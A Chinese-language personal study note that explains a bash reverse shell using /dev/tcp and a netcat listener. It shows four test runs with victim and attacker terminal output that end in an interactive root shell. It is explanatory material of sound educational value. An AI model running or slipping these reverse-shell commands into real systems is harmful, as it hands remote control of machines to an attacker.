# Shell Commands Prompts & Correction

[TOC]



## Res
### Related Topics



## Shell Commands in Security
### Reverse Shell
`/bin/bash -i > /dev/tcp/10.201.61.194/5566 0>&1 2>&1`
1. bash -i 创建一个交互的bash shell。
2. /dev/tcp/是Linux中的一个特殊设备文件,实际这个文件是不存在的，它只是 bash 用来实现网络请求的一个接口。打开这个文件就相当于发出了一个socket调用，建立一个socket连接，读写这个文件就相当于在这个socket连接中传输数据。同理，Linux中还存在/dev/udp/。
3. “>&”和“0>&1”
	1. 要想了解“>&”和“0>&1”，首先我们要先了解一下Linux文件描述符和重定向。linux shell下常用的文件描述符是：
		1. 标准输入(stdin) ：代码为 0 ，使用 < 或 <<
		2. 标准输出(stdout)：代码为 1 ，使用 > 或 >>
		3. 标准错误输出(stderr)：代码为 2 ，使用 2> 或 2>>
		4. 这里的”>&”与”&>”是等价的，都是表示混合输出，即标准输出1 + 错误输出2。其实 2>&1也是将标准错误输出重定向到标准输出中的意思。那么按照这个逻辑，“0>&1”就是将标准输入重定向到标准输出中。事实也就是如此，“0>&1”跟“0&>1”同样也是等价的。
4. 命令中的`0>&1` 和 `2>&1`按顺序对于前面的消息流，这个例子中分别对应的是 `/bin/bash` 和 `/dev/tcp/10.201.61.194/5566`。即`0>&1` 将 `/bin/bash`的 标准输入和错误输出（0）混合重定向（>&）到 `/dev/tcp/10.201.61.195/5566`的标准输出（1）。`2>&1`同理。

`nc -lkvp 7777`
1. -l 表示监听状态
2. -v 表示打印详细信息
3. -p 表示指定端口
4. -k 表示当前连接断开后不退出程序，继续等待下一个连接

```shell
# ---------------------------------------------------------------
# Victim:
[root@victim ~]$ bash -i > /dev/tcp/10.201.61.194/5566        # 第二步
[root@victim ~]$ hostname                                     # 第三步
[root@victim ~]$

# Attacker：
[root@hacker ~]$ nc -lvp 5566                                 # 第一步

Ncat: Version 7.50 ( https://nmap.org/ncat )
Ncat: Listening on :::5566
Ncat: Listening on 0.0.0.0:5566
Ncat: Connection from 10.201.61.195.
Ncat: Connection from 10.201.61.195:49018.

victim 
# 测试1结果：实现了将受害端的标准输出重定向到攻击端，但是还没实现用命令控制受害端。


# ----------------------------------------------------------------
# Victim:
[root@victim ~]$ bash -i < /dev/tcp/10.201.61.194/5566        # 第二步
[root@victim ~]$ hostname
victim

# Attacker：
[root@hacker ~]$ nc -lvp 5566                                 # 第一步
Ncat: Version 7.50 ( https://nmap.org/ncat )
Ncat: Listening on :::5566
Ncat: Listening on 0.0.0.0:5566
Ncat: Connection from 10.201.61.195.
Ncat: Connection from 10.201.61.195:50412.
hostname                                                      # 第三步（攻击端执行命令）
# 测试2结果：实现了将攻击端的输入重定向到受害端，但是攻击端看不到命令执行结果。


# ----------------------------------------------------------------
# Victim:
[root@victim ~]$ bash -i > /dev/tcp/10.201.61.194/5566 0>&1   # 第二步
[root@victim ~]$ hostname                                     # 受害端回显命令
[root@victim ~]$ id                                           # 受害端回显命令
[root@victim ~]$ hahaha                                       # 受害端回显命令
bash: hahaha: command not found                               # 受害端回显命令。显示错误命令的输出。

# Attacker：
[root@hacker ~]$  nc -lvp 5566                                # 第一步
Ncat: Version 7.50 ( https://nmap.org/ncat )
Ncat: Listening on :::5566
Ncat: Listening on 0.0.0.0:5566
Ncat: Connection from 10.201.61.195.
Ncat: Connection from 10.201.61.195:36792.
hostname                                                      # 第三步（攻击端执行命令）
victim
id                                                            # 第四步（攻击端执行命令）
uid=0(root) gid=0(root) groups=0(root)
hahaha                                                        # 第五步（执行一个错误的命令）

# 测试3结果：基本实现了反弹shell的功能。但是受害端的机器上依然回显了攻击者机器上执行的命令，且攻击端看不到错误命令的输出。


# ----------------------------------------------------------------
# Victim:
[root@victim ~]$ bash -i > /dev/tcp/10.201.61.194/5566 0>&1 2>&1 # 第二步。 
# 或bash -i &> /dev/tcp/10.201.61.194/5566 0>&1  （注：&>或>& 表示混合输出，即标准输出1 + 错误输出2）

# Attacker：
[root@hacker ~]$ nc -lvp 5566                                    # 第一步
Ncat: Version 7.50 ( https://nmap.org/ncat )
Ncat: Listening on :::5566
Ncat: Listening on 0.0.0.0:5566
Ncat: Connection from 10.201.61.195.
Ncat: Connection from 10.201.61.195:51182.
[root@victim ~]$ hostname                                        # 第三步。测试4结果：攻击端已获得受害端的远程交互式shell，而且受害端没有再回显攻击端输入的命令~
hostname
victim

# PS：由测试3、测试4对比可见，标准错误2不仅显示错误信息的作用，居然还有回显输入命令和终端提示符的作用~~~
```



## Shell Commands in Development



## Shell Commands in Others



## Ref

[反弹shell原理与实现 - PHP架构师之路的文章 - 知乎]: https://zhuanlan.zhihu.com/p/138393396

[反弹bash shell命令详解]: https://www.cnblogs.com/pandana/p/16289320.html)]: https://www.cnblogs.com/pandana/p/16289320.html
